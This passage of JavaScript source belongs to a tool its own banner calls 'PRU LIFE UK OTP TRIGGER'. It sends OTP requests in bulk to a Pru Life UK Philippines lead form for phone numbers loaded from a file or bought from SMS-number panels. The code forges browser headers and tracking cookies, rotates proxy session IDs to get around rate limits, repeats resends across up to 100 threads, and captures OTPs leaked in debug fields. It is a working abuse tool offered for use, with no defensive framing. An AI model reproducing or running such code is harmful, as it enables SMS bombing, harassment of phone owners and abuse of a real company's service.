  return v192.userAgent = v190, v192.secChUa = "\"Chromium\";v=\"" + v185.v + "\", " + v185.grease + ", \"Google Chrome\";v=\"" + v185.v + '\x22', v192.secChUaPlatform = v191, v192.chromeVersion = v185.v, v192;
}
function parseProxy(v193) {
  if (!v193) return null;
  if (typeof v193 === "object") return v193;
  v193 = v193.trim();
  if (!v193) return null;
  let v194, v195, v196, v197;
  if (v193.includes("://")) v193 = v193.split("://")[0x1];
  if (v193.includes('@')) {
    const v199 = v193.split('@'),
      v200 = v199[0x0].split(':'),
      v201 = v199[0x1].split(':');
    v196 = v200[0x0], v197 = v200[0x1], v194 = v201[0x0], v195 = parseInt(v201[0x1]);
  } else {
    const v202 = v193.split(':');
    if (v202.length === 0x2) v194 = v202[0x0], v195 = parseInt(v202[0x1]);else {
      if (v202.length === 0x4) !isNaN(parseInt(v202[0x3])) && isNaN(parseInt(v202[0x1])) ? (v196 = v202[0x0], v197 = v202[0x1], v194 = v202[0x2], v195 = parseInt(v202[0x3])) : (v194 = v202[0x0], v195 = parseInt(v202[0x1]), v196 = v202[0x2], v197 = v202[0x3]);else v202.length === 0x3 && (v194 = v202[0x0], v195 = parseInt(v202[0x1]), v196 = v202[0x2]);
    }
  }
  if (!v194 || !v195) return null;
  const v198 = {};
  v198.type = "http";
  v198.host = v194, v198.port = v195;
  return v198.user = v196, v198.pass = v197, v198.original = v193, v198;
}
function rotateSessionId(v203) {
  if (!v203) return null;
  const v204 = {
      ...v203
    },
    v205 = v204;
  const v206 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa),
    v207 = [/-ssid-[A-Za-z0-9_]+/i, /-session-[A-Za-z0-9_]+/i, /_session_[A-Za-z0-9_]+/i, /-sess-[A-Za-z0-9_]+/i, /_sessid_[A-Za-z0-9_]+/i, /-sessid-[A-Za-z0-9_]+/i, /_sid_[A-Za-z0-9_]+/i];
  let v208 = false;
  if (v205.user) for (const v209 of v207) {
    if (v209.test(v205.user)) {
      const v210 = v205.user.match(v209)[0x0].split(/[A-Za-z0-9_]+$/)[0x0];
      v205.user = v205.user.replace(v209, '' + v210 + v206), v208 = true;
      break;
    }
  }
  if (!v208 && v205.pass) for (const v211 of v207) {
    if (v211.test(v205.pass)) {
      const v212 = v205.pass.match(v211)[0x0].split(/[A-Za-z0-9_]+$/)[0x0];
      v205.pass = v205.pass.replace(v211, '' + v212 + v206);
      break;
    }
  }
  return v205;
}
function generateSessionCookies() {
  const v213 = Date.now();
  const v214 = Math.floor(v213 / 0x3e8),
    v215 = v214 - Math.floor(Math.random() * 0x2d + 0xf),
    v216 = v215 * 0x3e8 + Math.floor(Math.random() * 0x384);
  const v217 = Math.floor(Math.random() * 0x35a4e900 + 0x5f5e100),
    v218 = Math.floor(Math.random() * 0x35a4e900 + 0x5f5e100),
    v219 = Math.floor(Math.random() * 0xc7d713b49da0000 + 0x16345785d8a0000),
    v220 = Math.floor(Math.random() * 0xc7d713b49da0000 + 0x16345785d8a0000),
    v221 = crypto.randomBytes(0xd).toString("hex").toUpperCase();
  const v222 = crypto.randomBytes(0xf).toString("base64").replace(/[^A-Za-z0-9]/g, '').substring(0x0, 0x14);
  const v223 = crypto.randomBytes(0xf).toString("base64").replace(/[^A-Za-z0-9]/g, '').substring(0x0, 0x14);
  return ["_twpid=tw." + v216 + '.' + v219, "_gid=GA1.3." + v217 + '.' + v215, "_fbp=fb.2." + v216 + '.' + v220, "_tt_enable_cookie=1", "_ttp=" + v221 + ".tt.2." + (v216 + 0x32), "_ga=GA1.3." + v218 + '.' + v215, "_gat_UA-168218788-10=1", "_gcl_au=1.1." + Math.floor(Math.random() * 0x35a4e900 + 0x5f5e100) + '.' + v215, "_ga_YQD7M3257F=GS2.1.s" + v215 + "$o1$g1$t" + v214 + '$j' + Math.floor(Math.random() * 0x3c + 0xa) + "$l0$h0", "ttcsid_COGV1RRC77U9B3UA6510=" + (v216 + 0x38) + '::' + v222 + ".1." + v213 + '.1', "ttcsid=" + (v216 + 0x39) + '::' + v223 + ".1." + v213 + ".0::1.496229.497833"].join(';\x20');
}
function createProxyAgent(v224) {
  if (!v224) return null;
  const v225 = typeof v224 === "string" ? parseProxy(v224) : v224;
  if (!v225) return null;
  let v226 = '';
  return v225.type === "socks5" || v225.type === "socks4" ? (v226 = "socks5://" + (v225.user ? encodeURIComponent(v225.user) + ':' + encodeURIComponent(v225.pass || '') + '@' : '') + v225.host + ':' + v225.port, new SocksProxyAgent(v226)) : (v226 = "http://" + (v225.user ? encodeURIComponent(v225.user) + ':' + encodeURIComponent(v225.pass || '') + '@' : '') + v225.host + ':' + v225.port, new HttpsProxyAgent(v226));
}
function sendRequest(v227, v228, v229, v230, v231 = null, v232 = 0x61a8) {
  return new Promise((v233, v234) => {
    const v235 = new URL(v227);
    const v236 = {
      ...v229
    };
    let v237 = v236;
    !v237["Accept-Encoding"] && (v237["Accept-Encoding"] = "gzip, deflate, br, zstd");
    v230 && (v237["Content-Length"] = Buffer.byteLength(v230));
    const v238 = {};
    v238.hostname = v235.hostname;
    v238.path = v235.pathname + v235.search;
    v238.method = v228, v238.headers = v237, v238.timeout = v232;
    const v239 = v238;
    if (v231) {
      if (typeof v231 === "object" && (v231 instanceof https.Agent || v231 instanceof http.Agent || v231.addRequest)) v239.agent = v231;else {
        const v241 = typeof v231 === "object" ? v231 : parseProxy(v231);
        if (!v241 || isNaN(v241.port) || v241.port <= 0x0) return v234(new Error("FATAL: Invalid proxy. Aborting to prevent IP leak."));
        v239.agent = createProxyAgent(v241);
      }
    } else {
      const v242 = {};
      v242.keepAlive = false, v239.agent = new https.Agent(v242);
    }
    const v240 = https.request(v239, v243 => {
      const v244 = [];
      v243.on("data", v245 => v244.push(v245)), v243.on("error", v234);
      v243.on("end", () => {
        let v246 = Buffer.concat(v244);
        const v247 = v243.headers["content-encoding"];
        if (v247 === "gzip") try {
          v246 = zlib.gunzipSync(v246);
        } catch (v248) {} else {
          if (v247 === "deflate") try {
            v246 = zlib.inflateSync(v246);
          } catch (v249) {} else {
            if (v247 === 'br') try {
              v246 = zlib.brotliDecompressSync(v246);
            } catch (v250) {}
          }
        }
        v233({
          'status': v243.statusCode,
          'data': v246.toString("utf8"),
          'headers': v243.headers
        });
      });
    });
    v240.on("error", v234), v240.on("timeout", () => {
      v240.destroy();
      v234(new Error("timeout"));
    });
    if (v230) v240.write(v230);
    v240.end();
  });
}
async function triggerOTP(v251, v252 = {}) {
  const {
      onStatus = () => {},
      proxy = null,
      timeout = 0x61a8,
      resendCount = 0x0,
      resendDelay = 0xf
    } = v252,
    v253 = normalizePhoneNumber(v251);
  const v254 = getRandomClient(),
    v255 = generateSessionCookies(),
    v256 = crypto.randomUUID ? crypto.randomUUID() : ([0x989680] + -1000 + -4000 + -8000 + -100000000000).replace(/[018]/g, v261 => (v261 ^ crypto.randomBytes(0x1)[0x0] & 0xf >> v261 / 0x4).toString(0x10)),
    v257 = {};
  v257.keepAlive = true, v257.maxSockets = 0x5;
  const v258 = proxy ? createProxyAgent(proxy) : new https.Agent(v257),
    v259 = {};
  v259.Accept = "*/*", v259["Accept-Encoding"] = "gzip, deflate, br, zstd", v259["Accept-Language"] = "en-US,en;q=0.9", v259.Connection = "keep-alive", v259["Content-Type"] = "application/x-www-form-urlencoded", v259.Cookie = v255;
  v259.Host = "cloud.info.prulifeuk.com.ph", v259.Origin = "https://cloud.info.prulifeuk.com.ph", v259.Referer = "https://cloud.info.prulifeuk.com.ph/pruwealth-10-flex-elite", v259["Sec-Fetch-Dest"] = "empty", v259["Sec-Fetch-Mode"] = "cors";
  v259["Sec-Fetch-Site"] = "same-origin", v259["User-Agent"] = v254.userAgent, v259["sec-ch-ua"] = v254.secChUa;
  v259["sec-ch-ua-mobile"] = '?0', v259["sec-ch-ua-platform"] = v254.secChUaPlatform;
  const v260 = v259,
    fn3 = async v262 => {
      onStatus(v262 + " Sending OTP to " + v253 + "...");
      const v263 = "otpAction=sendOTP&mobile=" + encodeURIComponent(v253) + "&leadid=" + encodeURIComponent(v256),
        v264 = await sendRequest("https://cloud.info.prulifeuk.com.ph/pruwealth-10-flex-elite", "POST", v260, v263, v258, timeout);
      debugLog(v253, "pru-otp-" + v262, v264.data);
      let v265 = {};
      try {
        v265 = JSON.parse(v264.data);
      } catch (v266) {
        const v267 = {};
        v267.raw = v264.data, v265 = v267;
      }
      if (v265.status === "OTPSent") {
        const v268 = v265.otp_debug || (v265.smsDebug?.["payload"] ? (() => {
            try {
              const v270 = JSON.parse(v265.smsDebug.payload);
              return v270.Data?.["OTP"] || null;
            } catch {
              return null;
            }
          })() : null),
          v269 = {};
        return v269.success = true, v269.otp = v268, v269.data = v265, v269;
      } else {
        if (v264.status === 0x1ad) throw new Error("Rate Limited (429) — Too many requests from this IP");else {
          const v271 = v265.status || v265.message || v265.error || "Failed (HTTP " + v264.status + ')';
          throw new Error(v271);
        }
      }
    };
  try {
    const v272 = await fn3("[1/1]"),
      v273 = [];
    if (v272.otp) v273.push(v272.otp);
    let v274 = 0x0;
    if (resendCount > 0x0) for (let v277 = 0x1; v277 <= resendCount; v277++) {
      onStatus("[Resend " + v277 + '/' + resendCount + "] Cooldown " + resendDelay + "s for " + v253 + "..."), await new Promise(v278 => setTimeout(v278, resendDelay * 0x3e8));
      try {
        const v279 = await fn3("[Resend " + v277 + '/' + resendCount + ']');
        if (v279.otp) v273.push(v279.otp);
        v274++;
      } catch (v280) {
        debugLog(v253, "pru-resend-" + v277 + "-fail", v280.message);
      }
    }
    const v275 = v274 > 0x0 ? " (+" + v274 + " Resend" + (v274 > 0x1 ? 's' : '') + ')' : '';
    onStatus("✅ OTP Dispatched" + v275);
    const v276 = {};
    return v276.success = true, v276.message = "OTP Dispatched" + v275, v276.phone = v253, v276.successfulResends = v274, v276.leadId = v256, v276;
  } catch (v281) {
    const v282 = {};
    return v282.success = false, v282.message = '' + v281.message, v282.phone = v253, v282;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v283) {
      this.totalNumbers = v283;
      this.processed = 0x0, this.successful = 0x0;
      this.failed = 0x0;
      this.startTime = Date.now();
    }
    ["addLog"](v284, v285) {
      let v286 = '';
      if (v285 === "success") v286 = chalk.hex("#ED1B2D").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#00C9A7")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#FFD700").bold(v284.replace("Triggered OTP for ", ''));else {
        if (v285 === "retry") v286 = chalk.hex("#FFD700").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FFD700")(v284);else {
          const v287 = v284.match(/\+?\d{7,}/),
            v288 = v287 ? v287[0x0] : '',
            v289 = v284.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          v286 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v288 ? '' + v288 : '') + chalk.hex("#555555")(v288 ? " → " : '') + chalk.hex("#888888")(v289);
        }
      }
      process.stdout.write("\r[K" + v286 + '\x0a'), this.render();
    }
    ["setStatus"](v290) {}
    ["update"]() {}
    ["render"]() {
      const v291 = this.processed / Math.max(this.totalNumbers, 0x1),
        v292 = (v291 * 0x64).toFixed(0x1),
        v293 = Math.round(v291 * 0x14),
        v294 = 0x14 - v293,
        v295 = chalk.hex("#ED1B2D")('█'.repeat(v293)) + chalk.hex("#333333")('░'.repeat(v294)),
        v296 = '\x20\x20' + chalk.hex("#ED1B2D").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v295 + chalk.hex("#888888")('\x20' + v292 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#00C9A7").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v296);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v297 = Math.floor((Date.now() - this.startTime) / 0x3e8),
        v298 = Math.floor(v297 / 0x3c),
        v299 = v297 % 0x3c;
      const v300 = v298 + 'm\x20' + v299 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  PRU LIFE UK OTP TRIGGER — COMPLETE        ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v300.padEnd(0x6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v301, v302) {
    return new Promise(v303 => {
      let v304 = 0x0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn4 = () => {
        process.stdout.write("[2J[H");
        printHeader();
        console.log("   [33m" + v301 + "[0m\n");
        v302.forEach((v305, v306) => {
          v306 === v304 ? console.log("   [36m➔[35m " + v305.name + "[0m") : console.log("     [90m" + v305.name + "[0m");
        });
      };
      fn4();
      const fn5 = (v307, v308) => {
        if (v308.ctrl && v308.name === 'c') process.exit(0x0);
        if (v308.name === 'up') v304 = (v304 - 0x1 + v302.length) % v302.length, fn4();else {
          if (v308.name === "down") v304 = (v304 + 0x1) % v302.length, fn4();else v308.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn5), v303(v302[v304].value));
        }
      };
      process.stdin.on("keypress", fn5);
    });
  }
  async function promptText(v309, v310) {
    return new Promise(v311 => {
      process.stdout.write("   [33m" + v309 + "[0m ");
      let v312 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn6 = v313 => {
        const v314 = v313.toString();
        if (v314.includes('\x0a') || v314.includes('\x0d')) {
          process.stdin.removeListener("data", fn6), v312 += v314.split(/[\r\n]/)[0x0];
          let v315 = v312.trim();
          if (v315.startsWith('\x22') && v315.endsWith('\x22')) v315 = v315.slice(0x1, -1);
          v311(v315 || v310);
        } else v312 += v314;
      };
      process.stdin.on("data", fn6);
    });
  }
  async function interactiveWizard() {
    let v316 = 0x1,
      v317 = "file",
      v318 = "numbers.txt",
      v319 = null,
      v320 = null,
      v321 = null,
      v322 = "none";
    let v323 = 0x14,
      v324 = 0x0,
      v325 = 0x5,
      v326 = null;
    const v327 = path.join(__dirname, ".nexa_api_key");
    while (true) {
      process.stdout.write("[2J[H"), printHeader();
      if (v316 === 0x1) {
        const v328 = {};
        v328.name = "❌ Exit Program", v328.value = "exit";
        const v329 = await selectOption("SELECT NUMBER SOURCE", [{
          'name': "📁 Load from file (numbers.txt)",
          'value': "file"
        }, {
          'name': "🌐 Auto fetch from NexaOTP Panel",
          'value': "nexa"
        }, {
          'name': "⚡ Auto fetch from Voltx (2oo9)",
          'value': "voltx"
        }, {
          'name': "🔥 Auto fetch from Stex (2oo9)",
          'value': "stex"
        }, {
          'name': "📱 Auto fetch from SMS Bower",
          'value': "smsbower"
        }, {
          'name': "⚡ Auto fetch from Zenex",
          'value': "zenex"
        }, v328]);
        if (v329 === "exit") process.exit(0x0);
        v317 = v329, v316 = 0x2;
      } else {
        if (v316 === 0x2) {
          if (v317 === "voltx" || v317 === "stex") {
            const v330 = v317 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
              v331 = v317 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
              v332 = v317 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
              v333 = v317 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
            let v334 = '',
              v335 = [],
              v336 = 0x32,
              v337 = false,
              v338 = 0x1;
            while (v338 <= 0x3 && !v337) {
              process.stdout.write("[2J[H"), printHeader();
              if (v338 === 0x1) {
                if (fs.existsSync(v331)) {
                  v334 = fs.readFileSync(v331, "utf8").trim();
                  const v339 = {};
                  v339.name = "Use saved key", v339.value = "use";
                  const v340 = {};
                  v340.name = "Enter new key", v340.value = "new";
                  const v341 = {};
                  v341.name = "Remove saved key", v341.value = "remove";
                  const v342 = {};
                  v342.name = "⬅️ Back", v342.value = "back";
                  const v343 = await selectOption(v330 + " key found (" + v334.substring(0x0, 0xa) + "...)", [v339, v340, v341, v342]);
                  if (v343 === "back") {
                    v337 = true;
                    break;
                  }
                  if (v343 === "remove") fs.existsSync(v331) && fs.unlinkSync(v331), v334 = '';else v343 === "new" && (v334 = '');
                }
                if (!v334) {
                  const v344 = await promptText("Enter " + v330 + " API Key (mauthapi):", '');
                  if (v344.toLowerCase() === "back") {
                    v337 = true;
                    break;
                  }
                  v334 = v344;
                  const v345 = {};
                  v345.name = 'No', v345.value = 'no';
                  const v346 = await selectOption("Save key?", [{
                    'name': "Yes",
                    'value': "yes"
                  }, v345]);
                  if (v346 === "yes" && v334) fs.writeFileSync(v331, v334, "utf8");
                }
                if (v334) v338 = 0x2;
              } else {
                if (v338 === 0x2) {
                  const v347 = {};
                  v347.name = "🔍 Auto Range Finder (scan console)", v347.value = "auto";
                  const v348 = {};
                  v348.name = "✏️  Enter manually", v348.value = "manual";
                  const v349 = {};
                  v349.name = "⬅️ Back", v349.value = "back";
                  const v350 = await selectOption("How to select ranges?", [v347, v348, v349]);
                  if (v350 === "back") {
                    v338 = 0x1;
                    continue;
                  }
                  if (v350 === "auto") {
                    const v351 = await autoRangeFinderFor2Oo(v334, v333, selectOption, promptText);
                    v351 && v351.length > 0x0 && (v335 = v351, v338 = 0x3);
                  } else {
                    v335 = [];
                    let v352 = true;
                    while (v352) {
                      const v353 = await promptText("Enter range #" + (v335.length + 0x1) + " (e.g. 63991XXX) or 'back':", '');
                      if (v353.toLowerCase() === "back") {
                        if (v335.length === 0x0) break;else {
                          v335.pop();
                          continue;
                        }
                      }
                      if (v353) v335.push(v353);
                      const v354 = {};
                      v354.name = "Yes", v354.value = "yes";
                      const v355 = {};
                      v355.name = 'No', v355.value = 'no';
                      const v356 = await selectOption("Added " + v335.length + ". Add another?", [v354, v355]);
                      if (v356 === 'no') v352 = false;
                    }
                    if (v335.length > 0x0) v338 = 0x3;
                  }
                } else {
                  if (v338 === 0x3) {
                    const v357 = await promptText("How many numbers? [default:50]:", '50');
                    if (v357.toLowerCase() === "back") {
                      v338 = 0x2;
                      continue;
                    }
                    v336 = parseInt(v357) || 0x32;
                    const v358 = {};
                    v358.provider = v317, v358.apiKey = v334, v358.getPath = v332, v358.consolePath = v333, v358.ranges = v335, v358.totalCount = v336, v326 = v358, v319 = null, v338 = 0x4;
                  }
                }
              }
            }
            if (v337) {
              v316 = 0x1;
              continue;
            }
            v316 = 0x3;
          } else {
            if (v317 === "smsbower") {
              let v359 = '',
                v360 = 'fb',
                v361 = '0',
                v362 = "0.5",
                v363 = 0x32,
                v364 = 0x1,
                v365 = false;
              while (v364 <= 0x4 && !v365) {
                process.stdout.write("[2J[H"), printHeader();
                if (v364 === 0x1) {
                  if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                    v359 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                    const v366 = {};
                    v366.name = "Remove saved key", v366.value = "remove";
                    const v367 = await selectOption("SMS Bower key found (" + v359.substring(0x0, 0xa) + "...)", [{
                      'name': "Use saved key",
                      'value': "use"
                    }, {
                      'name': "Enter new key",
                      'value': "new"
                    }, v366, {
                      'name': "⬅️ Back",
                      'value': "back"
                    }]);
                    if (v367 === "back") {
                      v365 = true;
                      break;
                    }
                    if (v367 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v359 = '';else {
                      if (v367 === "new") v359 = '';
                    }
                  }
                  if (!v359) {
                    v359 = await promptText("Enter SMS Bower API Key:", '');
                    if (v359.toLowerCase() === "back") {
                      v365 = true;
                      break;
                    }
                    const v368 = {};
                    v368.name = 'No', v368.value = 'no';
                    const v369 = await selectOption("Save key?", [{
                      'name': "Yes",
                      'value': "yes"
                    }, v368]);
                    if (v369 === "yes" && v359) fs.writeFileSync(SMSBOWER_KEY_FILE, v359, "utf8");
                  }
                  if (v359) v364 = 0x2;
                } else {
                  if (v364 === 0x2) {
                    v360 = await promptText("Service code (e.g. fb, ig, wa) [default: fb]:", 'fb');
                    if (v360.toLowerCase() === "back") {
                      v364 = 0x1;
                      continue;
                    }
                    v360 = v360 || 'fb', v364 = 0x3;
                  } else {
                    if (v364 === 0x3) {
                      v361 = await promptText("Country code (PH = 4, 0 = any) [default: 0]:", '0');
                      if (v361.toLowerCase() === "back") {
                        v364 = 0x2;
                        continue;
                      }
                      v361 = v361 || '0';
                      const v370 = await promptText("Max price per number [default: 0.5]:", "0.5");
                      v362 = v370 || "0.5", v364 = 0x4;
                    } else {
                      if (v364 === 0x4) {
                        const v371 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v371.toLowerCase() === "back") {
                          v364 = 0x3;
                          continue;
                        }
                        v363 = parseInt(v371) || 0x32;
                        const v372 = {};
                        v372.apiKey = v359, v372.service = v360, v372.country = v361, v372.maxPrice = v362, v372.totalCount = v363, v320 = v372, v319 = null, v326 = null, v321 = null, v364 = 0x5;
                      }
                    }
                  }
                }
              }
              if (v365) {
                v316 = 0x1;
                continue;
              }
              v316 = 0x3;
            } else {
              if (v317 === "zenex") {
                let v373 = '',
                  v374 = [],
                  v375 = 0x32,
                  v376 = 0x1,
                  v377 = false;
                while (v376 <= 0x3 && !v377) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v376 === 0x1) {
                    if (fs.existsSync(ZENEX_KEY_FILE)) {
                      v373 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                      const v378 = {};
                      v378.name = "Use saved key", v378.value = "use";
                      const v379 = {};
                      v379.name = "Enter new key", v379.value = "new";
                      const v380 = {};
                      v380.name = "Remove saved key", v380.value = "remove";
                      const v381 = {};
                      v381.name = "⬅️ Back", v381.value = "back";
                      const v382 = await selectOption("Zenex key found (" + v373.substring(0x0, 0xa) + "...)", [v378, v379, v380, v381]);
                      if (v382 === "back") {
                        v377 = true;
                        break;
                      }
                      if (v382 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v373 = '';else {
                        if (v382 === "new") v373 = '';
                      }
                    }
                    if (!v373) {
                      v373 = await promptText("Enter Zenex API Key (mapikey):", '');
                      if (v373.toLowerCase() === "back") {
                        v377 = true;
                        break;
                      }
                      const v383 = {};
                      v383.name = "Yes", v383.value = "yes";
                      const v384 = {};
                      v384.name = 'No', v384.value = 'no';
                      const v385 = await selectOption("Save key?", [v383, v384]);
                      if (v385 === "yes" && v373) fs.writeFileSync(ZENEX_KEY_FILE, v373, "utf8");
                    }
                    if (v373) v376 = 0x2;
                  } else {
                    if (v376 === 0x2) {
                      v374 = [];
                      let v386 = true;
                      while (v386) {
                        const v387 = await promptText("Enter range #" + (v374.length + 0x1) + " (e.g. 639910XXXX) or 'back':", '');
                        if (v387.toLowerCase() === "back") {
                          if (v374.length === 0x0) {
                            v377 = true;
                            break;
                          } else {
                            v374.pop();
                            continue;
                          }
                        }
                        if (v387) v374.push(v387);
                        const v388 = {};
                        v388.name = "Yes", v388.value = "yes";
                        const v389 = {};
                        v389.name = 'No', v389.value = 'no';
                        const v390 = await selectOption("Added " + v374.length + ". Add another?", [v388, v389]);
                        if (v390 === 'no') v386 = false;
                      }
                      if (v374.length > 0x0) v376 = 0x3;
                    } else {
                      if (v376 === 0x3) {
                        const v391 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v391.toLowerCase() === "back") {
                          v376 = 0x2;
                          continue;
                        }
                        v375 = parseInt(v391) || 0x32;
                        const v392 = {};
                        v392.apiKey = v373, v392.ranges = v374, v392.totalCount = v375, v321 = v392, v319 = null, v326 = null, v320 = null, v376 = 0x4;
                      }
                    }
                  }
                }
                if (v377) {
                  v316 = 0x1;
                  continue;
                }
                v316 = 0x3;
              } else {
                if (v317 === "file") {
                  const v393 = {};
                  v393.name = "✏️ Custom File Path", v393.value = "custom";
                  const v394 = await selectOption("SELECT TARGET NUMBERS FILE", [v393, {
                    'name': "⬅️ Go Back to Number Source",
                    'value': "back"
                  }]);
                  if (v394 === "back") {
                    v316 = 0x1;
                    continue;
                  }
                  if (v394 === "custom") {
                    const v395 = await promptText("Enter Numbers File Path:", "numbers.txt");
                    if (v395.toLowerCase() === "back") continue;
                    v318 = v395;
                  } else v318 = v394;
                  if (!fs.existsSync(v318)) fs.writeFileSync(v318, '');
                  v319 = null, v316 = 0x3;
                } else {
                  let v396 = 0x1,
                    v397 = false,
                    v398 = '',
                    v399 = [],
                    v400 = 0x32,
                    v401 = "/api/v1/numbers/get";
                  while (v396 <= 0x4 && !v397) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v396 === 0x1) {
                      if (fs.existsSync(v327)) {
                        const v402 = fs.readFileSync(v327, "utf8").trim(),
                          v403 = {};
                        v403.name = "No, enter new key", v403.value = 'no';
                        const v404 = {};
                        v404.name = "⬅️ Go Back to Number Source", v404.value = "back";
                        const v405 = await selectOption("Found saved API Key (..." + v402.slice(-4) + "). Use it?", [{
                          'name': "Yes, use saved key",
                          'value': "yes"
                        }, v403, {
                          'name': "Delete saved key",
                          'value': "delete"
                        }, v404]);
                        if (v405 === "back") {
                          v397 = true;
                          break;
                        }
                        if (v405 === "yes") v398 = v402;else {
                          if (v405 === "delete") {
                            if (fs.existsSync(v327)) fs.unlinkSync(v327);
                            v398 = '';
                          }
                        }
                      }
                      if (!v398) {
                        const v406 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                        if (v406.toLowerCase() === "back") {
                          v397 = true;
                          break;
                        }
                        v398 = v406;
                        const v407 = {};
                        v407.name = "Yes, save it", v407.value = "yes";
                        const v408 = {};
                        v408.name = 'No', v408.value = 'no';
                        const v409 = await selectOption("Save this key for future use?", [v407, v408]);
                        v409 === "yes" && v398 && fs.writeFileSync(v327, v398, "utf8");
                      }
                      if (v398) v396 = 0x2;
                    } else {
                      if (v396 === 0x2) {
                        v399 = [];
                        let v410 = true;
                        while (v410) {
                          const v411 = await promptText("Enter range #" + (v399.length + 0x1) + " (e.g. 639910XXXX) or type 'back':", '');
                          if (v411.toLowerCase() === "back") {
                            if (v399.length === 0x0) {
                              v396 = 0x1;
                              break;
                            } else {
                              v399.pop();
                              continue;
                            }
                          }
                          if (v411) v399.push(v411);
                          const v412 = {};
                          v412.name = "Yes, add another range", v412.value = "yes";
                          const v413 = {};
                          v413.name = "No, proceed to next step", v413.value = 'no';
                          const v414 = {};
                          v414.name = "⬅️ Go Back to API Key", v414.value = "back";
                          const v415 = await selectOption("Added " + v399.length + " range(s). Add another?", [v412, v413, v414]);
                          if (v415 === "back") {
                            v396 = 0x1;
                            break;
                          }
                          if (v415 === 'no') v410 = false;
                        }
                        if (v399.length > 0x0) v396 = 0x3;
                      } else {
                        if (v396 === 0x3) {
                          const v416 = await promptText("How many numbers to process? (type 'back' to go back) [default: 50]:", '50');
                          if (v416.toLowerCase() === "back") {
                            v396 = 0x2;
                            continue;
                          }
                          v400 = parseInt(v416) || 0x32, v396 = 0x4;
                        } else {
                          if (v396 === 0x4) {
                            const v417 = {};
                            v417.name = "Server 1 (/get)", v417.value = "/api/v1/numbers/get";
                            const v418 = {};
                            v418.name = "Server 2 (/p2/get)", v418.value = "/api/v1/numbers/p2/get";
                            const v419 = {};
                            v419.name = "⬅️ Go Back to Count Input", v419.value = "back";
                            const v420 = await selectOption("SELECT NEXA SERVER", [v417, v418, {
                              'name': "Server 3 (/p3/get)",
                              'value': "/api/v1/numbers/p3/get"
                            }, v419]);
                            if (v420 === "back") {
                              v396 = 0x3;
                              continue;
                            }
                            v401 = v420;
                            const v421 = {};
                            v421.apiKey = v398, v421.ranges = v399, v421.totalCount = v400, v421.serverEndpoint = v401, v319 = v421, v396 = 0x5;
                          }
                        }
                      }
                    }
                  }
                  if (v397) {
                    v316 = 0x1;
                    continue;
                  }
                  v316 = 0x3;
                }
              }
            }
          }
        } else {
          if (v316 === 0x3) {
            const v422 = {};
            v422.name = "✏️ Custom File Path", v422.value = "custom";
            const v423 = {};
            v423.name = "🚫 None (Direct Connection)", v423.value = "none";
            const v424 = await selectOption("SELECT PROXIES FILE", [v422, v423, {
              'name': "⬅️ Go Back to Numbers Selection",
              'value': "back"
            }]);
            if (v424 === "back") {
              v316 = 0x2;
              continue;
            }
            if (v424 === "custom") {
              const v425 = await promptText("Enter Proxies File Path:", "proxies.txt");
              if (v425.toLowerCase() === "back") continue;
              v322 = v425;
            } else v424 === "none" ? v322 = '' : v322 = v424;
            v316 = 0x4;
          } else {
            if (v316 === 0x4) {
              const v426 = {};
              v426.name = "10 Threads", v426.value = 0xa;
              const v427 = {};
              v427.name = "20 Threads (Default)", v427.value = 0x14;
              const v428 = {};
              v428.name = "50 Threads (Fast)", v428.value = 0x32;
              const v429 = {};
              v429.name = "100 Threads (Extreme)", v429.value = 0x64;
              const v430 = {};
              v430.name = "⌨️ Custom...", v430.value = "custom";
              const v431 = {};
              v431.name = "⬅️ Go Back to Proxies Selection", v431.value = "back";
              const v432 = await selectOption("SELECT THREADS", [v426, v427, v428, v429, v430, v431]);
              if (v432 === "back") {
                v316 = 0x3;
                continue;
              }
              if (v432 === "custom") {
